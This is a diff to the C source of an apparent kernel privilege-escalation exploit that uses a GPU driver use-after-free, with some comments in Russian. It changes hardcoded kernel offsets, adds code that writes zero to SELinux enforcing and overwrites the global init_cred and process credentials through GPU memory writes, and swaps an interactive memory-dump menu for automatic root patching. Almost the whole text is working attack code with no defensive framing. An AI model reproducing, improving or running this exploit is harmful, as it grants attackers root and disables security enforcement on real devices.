@@ -24,9 +24,10 @@
 
 // ==================== РЕАЛЬНЫЕ СМЕЩЕНИЯ ДЛЯ ВАШЕГО ЯДРА ====================
 // Updated with Batch Spray and Fast Scan optimizations
-#define KERNEL_BASE          0xffffffc03d000000ULL
-#define SELINUX_OFFSET       0x0000000002f74ce8ULL
-#define INIT_TASK_OFFSET     0x00000000024d90d0ULL
+#define KERNEL_BASE          0xffffffc010000000ULL
+#define SELINUX_OFFSET       0x02caa000ULL
+#define INIT_TASK_OFFSET     0x02afb380ULL
+#define INIT_CRED_OFFSET     0x018f9038ULL
 
 #define OFFSET_PID           0x650
 #define OFFSET_TGID          0x658
@@ -1245,7 +1246,11 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
         }
     }
 
-    // 2. Apply Verified Offsets (SELinux and Credentials)
+    if (kernel_base == 0) {
+        fprintf(stderr, "[PARENT] [!] ERROR: Could not resolve KERNEL_BASE. Patching might fail.\n");
+    }
+
+    // 2. Apply Verified Offsets (SELinux and Global Credentials)
     if (kernel_base != 0) {
         // Strictly use verified SELINUX_OFFSET
         selinux_enforcing = kernel_base + SELINUX_OFFSET;
@@ -1253,31 +1258,24 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
         uint32_t zero = 0;
         gpu_write_task_virt(fd, selinux_enforcing, (uint8_t *)&zero, 4);
         
-        // Also ensure init_cred and init_task are known if needed for other logic
-        uint64_t init_task_va = kernel_base + INIT_TASK_OFFSET;
-        fprintf(stderr, "[PARENT] Verified init_task: 0x%lx\n", (unsigned long)init_task_va);
 #ifdef INIT_CRED_OFFSET
         uint64_t init_cred_va = kernel_base + INIT_CRED_OFFSET;
-        fprintf(stderr, "[PARENT] Verified init_cred: 0x%lx\n", (unsigned long)init_cred_va);
+        fprintf(stderr, "[PARENT] Patching global init_cred at 0x%lx...\n", (unsigned long)init_cred_va);
+        patch_cred_via_gpu(fd, init_cred_va, 0);
 #endif
     }
 
-    // 3. Mass Patch all CREDs matching our UID
-    int count = mass_patch_creds(fd, my_uid);
-    
-    if (count > 0) {
-        fprintf(stderr, "[PARENT] [+] MASS PATCH SUCCESSFUL! (%d creds)\n", count);
-        return 0;
-    }
-    
-    // Fallback to specific pointer if mass patch found nothing
+    // 3. Patch specific process credentials (most reliable)
     if (cred_ptr != 0) {
-        fprintf(stderr, "[PARENT] Falling back to specific CRED patch at 0x%lx...\n", (unsigned long)cred_ptr);
-        patch_cred_via_gpu(fd, cred_ptr, cred_ptr);
-        return 0;
+        fprintf(stderr, "[PARENT] Patching target process CRED at 0x%lx...\n", (unsigned long)cred_ptr);
+        patch_cred_via_gpu(fd, cred_ptr, 0);
     }
 
-    return -1;
+    // 4. Mass Patch all CREDs matching our UID in UAF range (extra safety)
+    mass_patch_creds(fd, my_uid);
+    
+    fprintf(stderr, "[PARENT] --- PATCHING SEQUENCE COMPLETE ---\n");
+    return 0;
 }
 
 static void safe_cred_patch(void)
@@ -1783,171 +1781,17 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                     }
                 }
 
-                int user_decision = 0;
-                while (!user_decision) {
-                    fprintf(stderr, "\n    [>] Candidate PID %d at 0x%lx (Offset 0x%x)\n", found_pid, (unsigned long)task_start_va, off);
-                    fprintf(stderr, "    [>] Actions: [y] Use, [n] Skip, [1] Dump Task, [2] Dump CRED, [3] Custom, [4] Pages, [5] Scan neighbors, [6] Full Task, [7] Find all PIDs, [8] Global CRED Scan, [9] Deep Neighbor Dump: ");
-                    fflush(stderr);
-                    
-                    char choice = 0;
-                    if (read(0, &choice, 1) > 0) {
-                        char dummy; while(read(0, &dummy, 1) > 0 && dummy != '\n');
-
-                        if (choice == 'y' || choice == 'Y') {
-                            if (found_cred_ptr == 0) {
-                                fprintf(stderr, "    [!] Warning: No valid CRED found yet. Force use? (y/n): ");
-                                read(0, &choice, 1); while(read(0, &dummy, 1) > 0 && dummy != '\n');
-                                if (choice != 'y') continue;
-                                gpu_read_task_struct(fd, task_start_va + 0x6b0, (uint8_t *)&found_cred_ptr, 8);
-                            }
-                            
-                            // Parent patches it RIGHT NOW while we have the FD
-                            parent_patch_root(fd, found_cred_ptr);
-                            
-                            marker_found = 1;
-                            *(uint64_t *)&gbuf[GBUF_TASK_VA] = task_start_va;
-                            *(uint64_t *)&gbuf[GBUF_TARGET_PID] = found_pid;
-                            *(uint64_t *)&gbuf[GBUF_CRED_PTR] = found_cred_ptr;
-                            user_decision = 1;
-                        } else if (choice == 'n' || choice == 'N') {
-                            user_decision = 1;
-                        } else if (choice == '1') {
-                            uint8_t d[512]; gpu_read_task_struct(fd, task_start_va + off - 256, d, 512);
-                            hex_dump_internal("task_struct", task_start_va + off - 256, d, 512);
-                        } else if (choice == '2') {
-                            uint8_t d[128]; 
-                            uint64_t p = found_cred_ptr;
-                            if (p == 0) {
-                                gpu_read_task_struct(fd, task_start_va + OFFSET_CRED, (uint8_t *)&p, 8);
-                            }
-                            if (p != 0) {
-                                gpu_read_task_struct(fd, p, d, 128);
-                                hex_dump_internal("CRED", p, d, 128);
-                            } else {
-                                fprintf(stderr, "    [!] No CRED pointer available.\n");
-                            }
-                        } else if (choice == '3') {
-                            fprintf(stderr, "    Enter VA in hex: ");
-                            char buf[32]; int len = read(0, buf, 31); buf[len] = 0;
-                            uint64_t custom_va = strtoull(buf, NULL, 16);
-                            uint8_t d[256]; gpu_read_task_struct(fd, custom_va, d, 256);
-                            hex_dump_internal("Custom VA Target", custom_va, d, 256);
-                        } else if (choice == '4') {
-                            fprintf(stderr, "    --- Dumping 5 Pages around 0x%lx ---\n", (unsigned long)current_va);
-                            for (int p = -2; p <= 2; p++) {
-                                uint64_t pva = current_va + p * PAGE_SIZE;
-                                uint8_t page_data[256];
-                                if (gpu_read_task_struct(fd, pva, page_data, 256) == 0) {
-                                    fprintf(stderr, "    [Page %+d at 0x%lx]\n", p, (unsigned long)pva);
-                                    hex_dump_internal("Neighbor Page", pva, page_data, 256);
-                                }
-                            }
-                        } else if (choice == '5') {
-                            uid_t my_uid = getuid();
-                            fprintf(stderr, "    [*] Searching for CRED (UID %u) in GPU space (1024 pages window)...\n", my_uid);
-                            int found = 0;
-                            for (int p = -512; p <= 512; p++) {
-                                uint64_t pva = current_va + p * PAGE_SIZE;
-                                uint32_t check[16];
-                                if (gpu_read_task_struct(fd, pva, (uint8_t *)check, 64) == 0) {
-                                    for (int off_in_page = 0; off_in_page < 64 - 12; off_in_page += 4) {
-                                        uint32_t *ptr = (uint32_t *)((uint8_t *)check + off_in_page);
-                                        if (ptr[0] > 0 && ptr[0] < 200 && ptr[1] == my_uid && ptr[1] == ptr[2]) {
-                                            fprintf(stderr, "    [+++] MATCH FOUND at GPU VA 0x%lx + 0x%x (UID %u, usage %u)\n", 
-                                                    (unsigned long)pva, off_in_page, ptr[1], ptr[0]);
-                                            found_cred_ptr = pva + off_in_page;
-                                            found = 1; break;
-                                        }
-                                    }
-                                }
-                                if (found) break;
-                                if (p % 128 == 0) fprintf(stderr, ".");
-                            }
-                            if (!found) fprintf(stderr, "\n    [-] No CRED-like structures found in neighbors.\n");
-                        } else if (choice == '6') {
-                            fprintf(stderr, "    --- FULL task_struct Dump (4KB) at 0x%lx ---\n", (unsigned long)task_start_va);
-                            uint8_t full_task[4096];
-                            if (gpu_read_task_struct(fd, task_start_va, full_task, 4096) == 0) {
-                                hex_dump_internal("FULL task_struct", task_start_va, full_task, 4096);
-                            }
-                        } else if (choice == '7') {
-                            fprintf(stderr, "    [*] Finding all markers in UAF range...\n");
-                            uint64_t scan_start = UAF_START;
-                            uint64_t scan_end = UAF_START + UAF_SIZE;
-                            int found_cnt = 0;
-                            for (uint64_t pva = scan_start; pva < scan_end; pva += PAGE_SIZE) {
-                                uint8_t page[4096];
-                                if (gpu_read_task_struct(fd, pva, page, 4096) == 0) {
-                                    pid_t fpid = 0;
-                                    if (find_marker_in_page(page, 4096, pva, &fpid)) {
-                                        fprintf(stderr, "    [+] Found PID %d at 0x%lx\n", fpid, (unsigned long)pva);
-                                        found_cnt++;
-                                    }
-                                }
-                                if (((pva - scan_start) / PAGE_SIZE) % 2048 == 0) fprintf(stderr, ".");
-                            }
-                            fprintf(stderr, "\n    [*] Done. Found %d total markers.\n", found_cnt);
-                        } else if (choice == '8') {
-                            uid_t my_uid = getuid();
-                            fprintf(stderr, "    [*] GLOBAL SCAN for CRED (UID %u) in UAF Range...\n", my_uid);
-                            uint64_t scan_start = UAF_START;
-                            uint64_t scan_end = UAF_START + UAF_SIZE;
-                            int found = 0;
-                            for (uint64_t pva = scan_start; pva < scan_end; pva += PAGE_SIZE) {
-                                uint32_t check[16];
-                                if (gpu_read_task_struct(fd, pva, (uint8_t *)check, 64) == 0) {
-                                    for (int off_in_page = 0; off_in_page < 64 - 12; off_in_page += 4) {
-                                        uint32_t *ptr = (uint32_t *)((uint8_t *)check + off_in_page);
-                                        if (ptr[0] > 0 && ptr[0] < 200 && ptr[1] == my_uid && ptr[1] == ptr[2]) {
-                                            fprintf(stderr, "\n    [+++] GLOBAL MATCH at 0x%lx + 0x%x (UID %u, usage %u)\n", 
-                                                    (unsigned long)pva, off_in_page, ptr[1], ptr[0]);
-                                            found_cred_ptr = pva + off_in_page;
-                                            found = 1; break;
-                                        }
-                                    }
-                                }
-                                if (found) break;
-                                if (((pva - scan_start) / PAGE_SIZE) % 2048 == 0) fprintf(stderr, ".");
-                            }
-                            if (!found) fprintf(stderr, "\n    [-] Not found in UAF range.\n");
-                        } else if (choice == '9') {
-                            uint64_t target = found_cred_ptr ? (found_cred_ptr & ~0xFFFULL) : (current_va & ~0xFFFULL);
-                            fprintf(stderr, "    Enter relative page offset (-10 to 10) or press Enter for default (-2 to 2): ");
-                            char buf[32]; int len = read(0, buf, 31); buf[len] = 0;
-                            int p_start = -2, p_end = 2;
-                            if (len > 1) {
-                                int val = atoi(buf);
-                                p_start = val; p_end = val;
-                            }
-                            
-                            fprintf(stderr, "    --- Page Dump around 0x%lx ---\n", (unsigned long)target);
-                            for (int p = p_start; p <= p_end; p++) {
-                                uint64_t pva = target + p * PAGE_SIZE;
-                                uint8_t full_page[4096];
-                                if (gpu_read_task_struct(fd, pva, full_page, 4096) == 0) {
-                                    fprintf(stderr, "\n[PAGE %+d at 0x%lx]\n", p, (unsigned long)pva);
-                                    // Compact dump: only non-zero lines or every 64 bytes
-                                    for (int i = 0; i < 4096; i += 32) {
-                                        int all_zero = 1;
-                                        for (int j = 0; j < 32; j++) if (full_page[i+j] != 0) { all_zero = 0; break; }
-                                        if (!all_zero) {
-                                            fprintf(stderr, "%04x: ", i);
-                                            for (int j = 0; j < 32; j++) fprintf(stderr, "%02x%s", full_page[i+j], (j%8==7)?"  ":" ");
-                                            fprintf(stderr, "| ");
-                                            for (int j = 0; j < 32; j++) {
-                                                uint8_t c = full_page[i+j];
-                                                fprintf(stderr, "%c", (c >= 0x20 && c <= 0x7e) ? c : '.');
-                                            }
-                                            fprintf(stderr, "\n");
-                                        }
-                                    }
-                                } else {
-                                    fprintf(stderr, "\n[PAGE %+d at 0x%lx] READ FAILED\n", p, (unsigned long)pva);
-                                }
-                            }
-                        }
-                    }
-                }
+                // AUTOMATIC PATCHING TRIGGERED
+                fprintf(stderr, "\n    [!] AUTOMATIC PATCHING TRIGGERED for PID %d...\n", found_pid);
+                
+                // Parent patches it RIGHT NOW while we have the FD
+                parent_patch_root(fd, found_cred_ptr);
+                
+                marker_found = 1;
+                *(uint64_t *)&gbuf[GBUF_TASK_VA] = task_start_va;
+                *(uint64_t *)&gbuf[GBUF_TARGET_PID] = found_pid;
+                *(uint64_t *)&gbuf[GBUF_CRED_PTR] = found_cred_ptr;
+                break;
             }
         }
 
